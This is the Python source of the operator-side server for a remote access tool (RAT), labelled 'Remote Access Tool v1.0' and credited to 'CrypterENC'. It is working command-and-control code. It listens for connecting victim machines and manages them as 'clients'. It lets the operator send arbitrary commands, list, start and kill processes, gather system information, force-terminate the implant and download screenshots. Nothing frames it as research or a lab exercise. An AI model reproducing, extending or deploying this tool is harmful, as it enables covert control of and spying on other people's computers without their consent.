import socket
import select
import sys
import threading
import os
import platform
import time
import colorama # type: ignore  
from colorama import Fore, Style # type: ignore

# Initialize colorama
colorama.init(autoreset=True)

# Banner
def print_banner():
    banner = f"""
{Fore.RED}██████╗  {Fore.WHITE}█████╗  {Fore.LIGHTBLUE_EX}████████╗ {Fore.RED} █████╗  {Fore.WHITE}████████╗ {Fore.LIGHTBLUE_EX} ██████╗  {Fore.RED}██╗   ██╗ {Fore.WHITE}██╗ {Fore.LIGHTBLUE_EX}██╗     {Fore.RED}██╗     {Fore.WHITE}███████╗{Style.RESET_ALL}
{Fore.RED}██╔══██╗ {Fore.WHITE}██╔══██╗ {Fore.LIGHTBLUE_EX}╚══██╔══╝ {Fore.RED}██╔══██╗ {Fore.WHITE}╚══██╔══╝ {Fore.LIGHTBLUE_EX}██╔═══██╗ {Fore.RED}██║   ██║ {Fore.WHITE}██║ {Fore.LIGHTBLUE_EX}██║     {Fore.RED}██║     {Fore.WHITE}██╔════╝{Style.RESET_ALL}
{Fore.RED}██████╔╝ {Fore.WHITE}███████║ {Fore.LIGHTBLUE_EX}   ██║    {Fore.RED}███████║ {Fore.WHITE}   ██║    {Fore.LIGHTBLUE_EX}██║   ██║ {Fore.RED}██║   ██║ {Fore.WHITE}██║ {Fore.LIGHTBLUE_EX}██║     {Fore.RED}██║     {Fore.WHITE}█████╗  {Style.RESET_ALL}
{Fore.RED}██╔══██╗ {Fore.WHITE}██╔══██║ {Fore.LIGHTBLUE_EX}   ██║    {Fore.RED}██╔══██║ {Fore.WHITE}   ██║    {Fore.LIGHTBLUE_EX}██║   ██║ {Fore.RED}██║   ██║ {Fore.WHITE}██║ {Fore.LIGHTBLUE_EX}██║     {Fore.RED}██║     {Fore.WHITE}██╔══╝  {Style.RESET_ALL}
{Fore.RED}██║  ██║ {Fore.WHITE}██║  ██║ {Fore.LIGHTBLUE_EX}   ██║    {Fore.RED}██║  ██║ {Fore.WHITE}   ██║    {Fore.LIGHTBLUE_EX}╚██████╔╝ {Fore.RED}╚██████╔╝ {Fore.WHITE}██║ {Fore.LIGHTBLUE_EX}███████╗ {Fore.RED}███████╗ {Fore.WHITE}███████╗{Style.RESET_ALL}
{Fore.RED}╚═╝  ╚═╝ {Fore.WHITE}╚═╝  ╚═╝ {Fore.LIGHTBLUE_EX}   ╚═╝    {Fore.RED}╚═╝  ╚═╝ {Fore.WHITE}   ╚═╝    {Fore.LIGHTBLUE_EX}╚═════╝  {Fore.RED} ╚═════╝  {Fore.WHITE}╚═╝ {Fore.LIGHTBLUE_EX}╚══════╝ {Fore.RED}╚══════╝ {Fore.WHITE}╚══════╝{Style.RESET_ALL}
{Fore.CYAN}Remote Access Tool v1.0{Style.RESET_ALL}
{Fore.YELLOW}Created by: CrypterENC{Style.RESET_ALL}
"""
    print(banner)

# Configuration
PORT = 8888
HOST = '0.0.0.0'  # Listen on all interfaces
BUFFER_SIZE = 1024
MAX_CLIENTS = 10

# Global variables
client_sockets = [None] * MAX_CLIENTS
active_client = -1
running = True
server_running = False
server_socket = None
accept_thread = None
monitor_thread = None

def clear_screen():
    """Clear the terminal screen based on OS"""
    os.system('cls' if platform.system() == 'Windows' else 'clear')

def print_prompt():
    """Print the command prompt"""
    sys.stdout.write(f"{Fore.GREEN}RAT> {Style.RESET_ALL}")
    sys.stdout.flush()

def list_clients():
    """List all connected clients"""
    count = 0
    print(f"\n{Fore.CYAN}Connected clients:{Style.RESET_ALL}")
    
    for i, client in enumerate(client_sockets):
        if client:
            addr = client.getpeername()
            print(f"{Fore.YELLOW}[{i}]{Style.RESET_ALL} Client: {Fore.WHITE}{addr[0]}:{addr[1]}")
            count += 1
    
    if count == 0:
        print(f"{Fore.RED}No clients connected{Style.RESET_ALL}")

def handle_client_disconnect(client_id):
    """Handle client disconnection"""
    global active_client
    
    if client_sockets[client_id]:
        try:
            client_sockets[client_id].close()
        except:
            pass
        client_sockets[client_id] = None
        
        if active_client == client_id:
            active_client = -1
        
        print(f"\n{Fore.RED}Client {client_id} disconnected{Style.RESET_ALL}")
        print_prompt()

def start_server():
    """Start the RAT server"""
    global server_running, server_socket, accept_thread, monitor_thread
    
    if server_running:
        print(f"{Fore.YELLOW}Server is already running{Style.RESET_ALL}")
        return
    
    # Create server socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server_socket.bind((HOST, PORT))
        server_socket.listen(5)
        server_running = True
        print(f"{Fore.GREEN}RAT Server started on {HOST}:{PORT}{Style.RESET_ALL}")
        
        # Start a thread to accept connections
        accept_thread = threading.Thread(target=accept_connections, args=(server_socket,))
        accept_thread.daemon = True
        accept_thread.start()
        
        # Start monitor thread
        monitor_thread = threading.Thread(target=monitor_clients)
        monitor_thread.daemon = True
        monitor_thread.start()
        
    except Exception as e:
        print(f"{Fore.RED}Error starting server: {e}{Style.RESET_ALL}")
        server_socket = None

def stop_server():
    """Stop the RAT server without exiting the program"""
    global server_running, server_socket, client_sockets
    
    if not server_running:
        print(f"{Fore.YELLOW}Server is not running{Style.RESET_ALL}")
        return
    
    # Close all client connections
    for i in range(MAX_CLIENTS):
        if client_sockets[i]:
            try:
                client_sockets[i].close()
            except:
                pass
            client_sockets[i] = None
    
    # Close server socket
    if server_socket:
        try:
            server_socket.close()
        except:
            pass
        server_socket = None
    
    server_running = False
    print(f"{Fore.GREEN}Server stopped{Style.RESET_ALL}")

def process_command(command):
    """Process user commands"""
    global active_client, running, server_running
    
    if command == "help":
        print(f"{Fore.CYAN}Available commands:{Style.RESET_ALL}")
        print(f"  {Fore.YELLOW}start{Style.RESET_ALL}             - Start the server")
        print(f"  {Fore.YELLOW}stop{Style.RESET_ALL}              - Stop the server")
        print(f"  {Fore.YELLOW}list{Style.RESET_ALL}              - List all connected clients")
        print(f"  {Fore.YELLOW}select <id>{Style.RESET_ALL}       - Select a client to interact with")
        print(f"  {Fore.YELLOW}kill <id>{Style.RESET_ALL}         - Force terminate a client session")
        print(f"  {Fore.YELLOW}procinfo{Style.RESET_ALL}          - Get process information from selected client")
        print(f"  {Fore.YELLOW}list_processes{Style.RESET_ALL}    - List all running processes on selected client")
        print(f"  {Fore.YELLOW}start_process <cmd>{Style.RESET_ALL} - Start a new process on selected client")
        print(f"  {Fore.YELLOW}terminate_process <pid>{Style.RESET_ALL} - Terminate a process on selected client")
        print(f"  {Fore.YELLOW}sysinfo{Style.RESET_ALL}           - Get detailed system information from selected client")
        print(f"  {Fore.YELLOW}screenshot{Style.RESET_ALL}        - Capture and download screenshot from client")
        print(f"  {Fore.YELLOW}exit{Style.RESET_ALL}              - Close connection with selected client")
        print(f"  {Fore.YELLOW}clear{Style.RESET_ALL}             - Clear the screen")
        print(f"  {Fore.YELLOW}options{Style.RESET_ALL}           - Configure server options")
        print(f"  {Fore.YELLOW}quit{Style.RESET_ALL}              - Exit the program")
    
    # Add kill command
    elif command.startswith("kill "):
        if not server_running:
            print(f"{Fore.RED}Server is not running{Style.RESET_ALL}")
        else:
            try:
                client_id = int(command.split(" ")[1])
                if 0 <= client_id < MAX_CLIENTS and client_sockets[client_id]:
                    # Send kill command to client
                    try:
                        client_sockets[client_id].send("kill_client".encode())
                        print(f"{Fore.RED}Kill command sent to client {client_id}{Style.RESET_ALL}")
                        # Wait a moment for the command to be processed
                        time.sleep(1)
                        # Then disconnect the client
                        handle_client_disconnect(client_id)
                    except:
                        print(f"{Fore.RED}Error sending kill command to client {client_id}{Style.RESET_ALL}")
                        handle_client_disconnect(client_id)
                else:
                    print(f"{Fore.RED}Invalid client ID{Style.RESET_ALL}")
            except (ValueError, IndexError):
                print(f"{Fore.RED}Invalid command format. Use 'kill <id>'{Style.RESET_ALL}")
    
    elif command == "start":
        start_server()
    
    elif command == "stop":
        stop_server()
    
    elif command == "list":
        if not server_running:
            print(f"{Fore.RED}Server is not running{Style.RESET_ALL}")
        else:
            list_clients()
    
    elif command.startswith("select "):
        if not server_running:
            print(f"{Fore.RED}Server is not running{Style.RESET_ALL}")
        else:
            try:
                client_id = int(command.split(" ")[1])
                if 0 <= client_id < MAX_CLIENTS and client_sockets[client_id]:
                    active_client = client_id
                    print(f"{Fore.GREEN}Selected client {client_id}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}Invalid client ID{Style.RESET_ALL}")
            except (ValueError, IndexError):
                print(f"{Fore.RED}Invalid command format. Use 'select <id>'{Style.RESET_ALL}")
    
    elif command == "clear":
        clear_screen()
    
    elif command == "options":
        show_options_panel()
    
    elif command == "quit":
        print(f"{Fore.YELLOW}Exiting program...{Style.RESET_ALL}")
        if server_running:
            stop_server()
        running = False
        return False
    
    elif active_client >= 0 and server_running:
        # Send command to active client
        try:
            client_sockets[active_client].send(command.encode())
            print(f"{Fore.CYAN}Command sent to client {active_client}: {command}{Style.RESET_ALL}")
            
            if command == "exit":
                print(f"{Fore.YELLOW}Closing connection with client {active_client}...{Style.RESET_ALL}")
                handle_client_disconnect(active_client)
            else:
                # Receive response
                try:
                    response = client_sockets[active_client].recv(BUFFER_SIZE).decode()
                    if not response:
                        print(f"{Fore.RED}Client {active_client} disconnected{Style.RESET_ALL}")
                        handle_client_disconnect(active_client)
                    else:
                        print(f"\n{Fore.GREEN}Response from client {active_client}:{Style.RESET_ALL}\n{response}")
                except:
                    print(f"{Fore.RED}Error receiving response from client {active_client}{Style.RESET_ALL}")
                    handle_client_disconnect(active_client)
        except:
            print(f"{Fore.RED}Error sending command to client {active_client}{Style.RESET_ALL}")
            handle_client_disconnect(active_client)
    
    elif command and not server_running:
        print(f"{Fore.RED}Server is not running. Use 'start' to start the server.{Style.RESET_ALL}")
    
    elif command:
        print(f"{Fore.RED}No client selected. Use 'select <id>' to select a client.{Style.RESET_ALL}")
    
    return True

def accept_connections(server_socket):
    """Accept new client connections"""
    global running, server_running
    
    while running and server_running:
        try:
            client, addr = server_socket.accept()
            
            # Find an empty slot for the new client
            for i in range(MAX_CLIENTS):
                if client_sockets[i] is None:
                    client_sockets[i] = client
                    print(f"\n{Fore.GREEN}New connection, client {i}: {addr[0]}:{addr[1]}{Style.RESET_ALL}")
                    print_prompt()
                    break
            else:
                # If no empty slot, reject the connection
                client.close()
        except:
            if not running or not server_running:
                break

def monitor_clients():
    """Monitor clients and handle disconnections"""
    global running, server_running
    
    while running and server_running:
        for i in range(MAX_CLIENTS):
            if client_sockets[i]:
                try:
                    # Check if client is still connected by sending empty data
                    client_sockets[i].send(b'')
                except:
                    print(f"\nClient {i} disconnected unexpectedly")
                    handle_client_disconnect(i)
        
        # Check every 5 seconds
        time.sleep(5)

def show_options_panel():
    """Display and modify server configuration options"""
    global PORT, HOST, BUFFER_SIZE, MAX_CLIENTS, client_sockets
    
    while True:
        clear_screen()
        print(f"\n{Fore.CYAN}=== SERVER OPTIONS PANEL ==={Style.RESET_ALL}")
        print(f"{Fore.YELLOW}1.{Style.RESET_ALL} Server Host: {Fore.GREEN}{HOST}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}2.{Style.RESET_ALL} Server Port: {Fore.GREEN}{PORT}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}3.{Style.RESET_ALL} Buffer Size: {Fore.GREEN}{BUFFER_SIZE}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}4.{Style.RESET_ALL} Max Clients: {Fore.GREEN}{MAX_CLIENTS}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}5.{Style.RESET_ALL} Save and Return")
        
        choice = input(f"\n{Fore.GREEN}Enter option number: {Style.RESET_ALL}")
        
        if choice == "1":
            new_host = input(f"{Fore.GREEN}Enter new host (current: {HOST}): {Style.RESET_ALL}")
            if new_host.strip():
                HOST = new_host
        elif choice == "2":
            try:
                new_port = int(input(f"{Fore.GREEN}Enter new port (current: {PORT}): {Style.RESET_ALL}"))
                if 1 <= new_port <= 65535:
                    PORT = new_port
                else:
                    print(f"{Fore.RED}Invalid port number. Must be between 1-65535.{Style.RESET_ALL}")
                    input(f"{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}Invalid input. Port must be a number.{Style.RESET_ALL}")
                input(f"{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
        elif choice == "3":
            try:
                new_buffer = int(input(f"{Fore.GREEN}Enter new buffer size (current: {BUFFER_SIZE}): {Style.RESET_ALL}"))
                if new_buffer > 0:
                    BUFFER_SIZE = new_buffer
                else:
                    print(f"{Fore.RED}Invalid buffer size. Must be positive.{Style.RESET_ALL}")
                    input(f"{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}Invalid input. Buffer size must be a number.{Style.RESET_ALL}")
                input(f"{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
        elif choice == "4":
            try:
                new_max = int(input(f"{Fore.GREEN}Enter new max clients (current: {MAX_CLIENTS}): {Style.RESET_ALL}"))
                if new_max > 0:
                    # If reducing max clients, handle existing connections
                    if new_max < MAX_CLIENTS:
                        for i in range(new_max, MAX_CLIENTS):
                            if client_sockets[i]:
                                print(f"{Fore.YELLOW}Warning: Disconnecting client {i} due to reduced max clients.{Style.RESET_ALL}")
                                handle_client_disconnect(i)
                    
                    # Resize client_sockets list
                    if new_max > MAX_CLIENTS:
                        client_sockets.extend([None] * (new_max - MAX_CLIENTS))
                    else:
                        client_sockets = client_sockets[:new_max]
                    
                    MAX_CLIENTS = new_max
                else:
                    print(f"{Fore.RED}Invalid max clients. Must be positive.{Style.RESET_ALL}")
                    input(f"{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}Invalid input. Max clients must be a number.{Style.RESET_ALL}")
                input(f"{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
        elif choice == "5":
            print(f"{Fore.GREEN}Options saved!{Style.RESET_ALL}")
            break
        else:
            print(f"{Fore.RED}Invalid option.{Style.RESET_ALL}")
            input(f"{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")

def show_main_menu():
    """Display the main menu options in columns"""
    clear_screen()
    print_banner()
    
    # Center the main title with 15px left offset (7 + 8)
    menu_width = 60
    title = "=== MAIN MENU ==="
    padding = (menu_width - len(title)) // 2 - 15  # Subtract 15 to move left
    padding = max(0, padding)  # Ensure padding doesn't go negative
    print(f"\n{' ' * padding}{Fore.CYAN}{title}{Style.RESET_ALL}\n\n")  # Added extra newline for more space
    
    # Menu items in two columns with equal height, also shifted left by 15px
    print(f"{Fore.YELLOW}1.{Style.RESET_ALL} Start Server   {Fore.YELLOW}5.{Style.RESET_ALL} Server Options")
    print(f"{Fore.YELLOW}2.{Style.RESET_ALL} Stop Server    {Fore.YELLOW}6.{Style.RESET_ALL} Clear Screen")
    print(f"{Fore.YELLOW}3.{Style.RESET_ALL} List Clients   {Fore.YELLOW}7.{Style.RESET_ALL} Help")
    print(f"{Fore.YELLOW}4.{Style.RESET_ALL} Select Client  {Fore.YELLOW}0.{Style.RESET_ALL} Exit")
    
    # Display server status with extra spacing before and after the section
    print(f"\n\n{Fore.CYAN}=== SERVER STATUS ==={Style.RESET_ALL}")
    print()  # Add one blank line under the SERVER STATUS title
    if server_running:
        client_count = sum(1 for client in client_sockets if client is not None)
        print(f"{Fore.GREEN}● Server running on {HOST}:{PORT}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}● Connected clients: {client_count}/{MAX_CLIENTS}{Style.RESET_ALL}")
        if active_client >= 0:
            print(f"{Fore.GREEN}● Active client: {active_client}{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}● Server stopped{Style.RESET_ALL}")
    
    print(f"\n\n{Fore.CYAN}=== OUTPUT ==={Style.RESET_ALL}")

def process_menu_choice(choice):
    """Process menu choices"""
    global active_client, running
    
    if choice == "1":
        start_server()
    elif choice == "2":
        stop_server()
    elif choice == "3":
        if not server_running:
            print(f"{Fore.RED}Server is not running{Style.RESET_ALL}")
        else:
            list_clients()
    elif choice == "4":
        if not server_running:
            print(f"{Fore.RED}Server is not running{Style.RESET_ALL}")
        else:
            try:
                client_id = int(input(f"{Fore.GREEN}Enter client ID to select: {Style.RESET_ALL}"))
                if 0 <= client_id < MAX_CLIENTS and client_sockets[client_id]:
                    active_client = client_id
                    print(f"{Fore.GREEN}Selected client {client_id}{Style.RESET_ALL}")
                    # Enter client command mode
                    client_command_mode()
                    # Redisplay menu after returning from client mode
                    return True
                else:
                    print(f"{Fore.RED}Invalid client ID{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}Invalid input. Client ID must be a number.{Style.RESET_ALL}")
    elif choice == "5":
        show_options_panel()
        # Redisplay menu after returning from options panel
        return True
    elif choice == "6":
        # Just redisplay the menu (clear screen is part of show_main_menu)
        return True
    elif choice == "7":
        show_help()
    elif choice == "0":
        print(f"{Fore.YELLOW}Exiting program...{Style.RESET_ALL}")
        if server_running:
            stop_server()
        running = False
        return False
    else:
        print(f"{Fore.RED}Invalid option. Please try again.{Style.RESET_ALL}")
    
    input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    return True

def client_command_mode():
    """Enter client command mode for the active client"""
    global active_client
    
    if active_client < 0 or not server_running:
        print(f"{Fore.RED}No client selected or server not running{Style.RESET_ALL}")
        return
    
    clear_screen()
    print_banner()
    print(f"{Fore.CYAN}=== CLIENT COMMAND MODE - Client {active_client} ==={Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Type 'back' to return to main menu or 'exit' to disconnect client{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Type 'help' to see available commands{Style.RESET_ALL}")
    print(f"\n{Fore.CYAN}=== OUTPUT ==={Style.RESET_ALL}")
    
    while active_client >= 0 and server_running:
        try:
            sys.stdout.write(f"{Fore.GREEN}Client {active_client}> {Style.RESET_ALL}")
            sys.stdout.flush()
            command = input()
            
            if command.lower() == "back":
                break
            
            if command.lower() == "help":
                show_client_commands()
                continue
            
            if command.lower() == "clear":
                clear_screen()
                print_banner()
                print(f"{Fore.CYAN}=== CLIENT COMMAND MODE - Client {active_client} ==={Style.RESET_ALL}")
                print(f"{Fore.YELLOW}Type 'back' to return to main menu or 'exit' to disconnect client{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}Type 'help' to see available commands{Style.RESET_ALL}")
                print(f"\n{Fore.CYAN}=== OUTPUT ==={Style.RESET_ALL}")
                continue
            
            # Handle kill command in client mode
            if command.lower() == "kill":
                try:
                    client_sockets[active_client].send("kill_client".encode())
                    print(f"{Fore.RED}Kill command sent to client {active_client}{Style.RESET_ALL}")
                    time.sleep(1)  # Wait a moment for the command to be processed
                    handle_client_disconnect(active_client)
                    input(f"\n{Fore.YELLOW}Press Enter to return to main menu...{Style.RESET_ALL}")
                    break
                except:
                    print(f"{Fore.RED}Error sending kill command to client {active_client}{Style.RESET_ALL}")
                    handle_client_disconnect(active_client)
                    input(f"\n{Fore.YELLOW}Press Enter to return to main menu...{Style.RESET_ALL}")
                    break
            
            # Handle procinfo command
            if command.lower() == "procinfo":
                try:
                    client_sockets[active_client].send("procinfo".encode())
                    print(f"{Fore.CYAN}Requesting process information from client {active_client}...{Style.RESET_ALL}")
                    
                    # Receive response
                    client_sockets[active_client].settimeout(10.0)
                    try:
                        response = client_sockets[active_client].recv(BUFFER_SIZE).decode()
                        if not response:
                            print(f"{Fore.RED}Client {active_client} disconnected{Style.RESET_ALL}")
                            handle_client_disconnect(active_client)
                            input(f"\n{Fore.YELLOW}Press Enter to return to main menu...{Style.RESET_ALL}")
                            break
                        
                        print(f"\n{Fore.CYAN}Process Information:{Style.RESET_ALL}")
                        print(response)
                    except socket.timeout:
                        print(f"{Fore.RED}Timeout waiting for response from client {active_client}{Style.RESET_ALL}")
                    except:
                        print(f"{Fore.RED}Error receiving response from client {active_client}{Style.RESET_ALL}")
                        handle_client_disconnect(active_client)
                        input(f"\n{Fore.YELLOW}Press Enter to return to main menu...{Style.RESET_ALL}")
                        break
                    finally:
                        client_sockets[active_client].settimeout(None)
                    
                    continue
                except:
                    print(f"{Fore.RED}Error sending command to client {active_client}{Style.RESET_ALL}")
                    handle_client_disconnect(active_client)
                    input(f"\n{Fore.YELLOW}Press Enter to return to main menu...{Style.RESET_ALL}")
                    break
            
            # Send command to active client
            try:
                # Check if client socket is still valid
                if not client_sockets[active_client]:
                    print(f"{Fore.RED}Client {active_client} is no longer connected{Style.RESET_ALL}")
                    active_client = -1
                    input(f"\n{Fore.YELLOW}Press Enter to return to main menu...{Style.RESET_ALL}")
                    break
                
                client_sockets[active_client].send(command.encode())
                print(f"{Fore.CYAN}Command sent to client {active_client}: {command}{Style.RESET_ALL}")
                
                if command.lower() == "exit":
                    print(f"{Fore.YELLOW}Closing connection with client {active_client}...{Style.RESET_ALL}")
                    handle_client_disconnect(active_client)
                    input(f"\n{Fore.YELLOW}Press Enter to return to main menu...{Style.RESET_ALL}")
                    break
                elif command.lower() == "screenshot":
                    # Handle screenshot command specially
                    filename = receive_screenshot(client_sockets[active_client])
                    if filename:
                        print(f"{Fore.GREEN}Screenshot saved successfully to {filename}{Style.RESET_ALL}")
                    else:
                        print(f"{Fore.RED}Failed to receive screenshot{Style.RESET_ALL}")
                else:
                    # Receive response
                    client_sockets[active_client].settimeout(10.0)
                    try:
                        response = client_sockets[active_client].recv(BUFFER_SIZE).decode()
                        if not response:
                            print(f"{Fore.RED}Client {active_client} disconnected{Style.RESET_ALL}")
                            handle_client_disconnect(active_client)
                            input(f"\n{Fore.YELLOW}Press Enter to return to main menu...{Style.RESET_ALL}")
                            break
                        else:
                            print(f"\n{Fore.GREEN}Response from client {active_client}:{Style.RESET_ALL}\n{response}")
                    except socket.timeout:
                        print(f"{Fore.RED}Timeout waiting for response from client {active_client}{Style.RESET_ALL}")
                    except:
                        print(f"{Fore.RED}Error receiving response from client {active_client}{Style.RESET_ALL}")
                        handle_client_disconnect(active_client)
                        input(f"\n{Fore.YELLOW}Press Enter to return to main menu...{Style.RESET_ALL}")
                        break
                    finally:
                        # Reset timeout to default
                        client_sockets[active_client].settimeout(None)
            except:
                print(f"{Fore.RED}Error sending command to client {active_client}{Style.RESET_ALL}")
                handle_client_disconnect(active_client)
                input(f"\n{Fore.YELLOW}Press Enter to return to main menu...{Style.RESET_ALL}")
                break
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}Returning to main menu...{Style.RESET_ALL}")
            break

def show_help():
    """Display help information"""
    print(f"{Fore.CYAN}Available commands when in client mode:{Style.RESET_ALL}")
    print(f"  {Fore.YELLOW}sysinfo{Style.RESET_ALL}           - Get detailed system information from selected client")
    print(f"  {Fore.YELLOW}screenshot{Style.RESET_ALL}        - Capture and download screenshot from client")
    print(f"  {Fore.YELLOW}exit{Style.RESET_ALL}              - Close connection with selected client")
    print(f"  {Fore.YELLOW}back{Style.RESET_ALL}              - Return to main menu")
    print(f"  {Fore.YELLOW}clear{Style.RESET_ALL}             - Clear the screen")

def show_client_commands():
    """Display available commands for client interaction"""
    print(f"{Fore.CYAN}Available commands in client command mode:{Style.RESET_ALL}")
    print(f"  {Fore.YELLOW}sysinfo{Style.RESET_ALL}           - Get detailed system information from selected client")
    print(f"  {Fore.YELLOW}procinfo{Style.RESET_ALL}          - Get process information from selected client")
    print(f"  {Fore.YELLOW}list_processes{Style.RESET_ALL}    - List all running processes on selected client")
    print(f"  {Fore.YELLOW}start_process <cmd>{Style.RESET_ALL} - Start a new process on selected client")
    print(f"  {Fore.YELLOW}terminate_process <pid>{Style.RESET_ALL} - Terminate a process on selected client")
    print(f"  {Fore.YELLOW}screenshot{Style.RESET_ALL}        - Capture and download screenshot from client")
    print(f"  {Fore.YELLOW}kill{Style.RESET_ALL}              - Force terminate the client process")
    print(f"  {Fore.YELLOW}exit{Style.RESET_ALL}              - Close connection with selected client")
    print(f"  {Fore.YELLOW}back{Style.RESET_ALL}              - Return to main menu")
    print(f"  {Fore.YELLOW}clear{Style.RESET_ALL}             - Clear the screen")
    print(f"  {Fore.YELLOW}help{Style.RESET_ALL}              - Show this help message")

def receive_screenshot(client_socket):
    """Receive screenshot data from client and save to file"""
    try:
        # First receive the file size
        size_data = client_socket.recv(8)
        file_size = int.from_bytes(size_data, byteorder='big')
        
        print(f"{Fore.CYAN}Receiving screenshot ({file_size} bytes)...{Style.RESET_ALL}")
        
        # Create screenshots directory if it doesn't exist
        if not os.path.exists("screenshots"):
            os.makedirs("screenshots")
        
        # Generate filename with timestamp
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        filename = f"screenshots/screenshot_{timestamp}.png"
        
        # Receive and save the file
        bytes_received = 0
        with open(filename, "wb") as f:
            while bytes_received < file_size:
                # Receive data in chunks
                chunk_size = min(BUFFER_SIZE, file_size - bytes_received)
                chunk = client_socket.recv(chunk_size)
                
                if not chunk:
                    break
                
                f.write(chunk)
                bytes_received += len(chunk)
                
                # Show progress
                progress = (bytes_received / file_size) * 100
                print(f"\r{Fore.CYAN}Progress: {progress:.1f}%{Style.RESET_ALL}", end="")
        
        print(f"\n{Fore.GREEN}Screenshot saved to {filename}{Style.RESET_ALL}")
        return filename
    except Exception as e:
        print(f"{Fore.RED}Error receiving screenshot: {str(e)}{Style.RESET_ALL}")
        return None

def main():
    """Main function to run the RAT server"""
    global running
    
    # Main menu loop
    while running:
        try:
            show_main_menu()
            choice = input(f"\n{Fore.GREEN}Enter option: {Style.RESET_ALL}")
            if not process_menu_choice(choice):
                break
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}Exiting program...{Style.RESET_ALL}")
            if server_running:
                stop_server()
            running = False
            break
        except Exception as e:
            print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
            input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")

# Call the main function when the script is executed
if __name__ == "__main__":
    main()






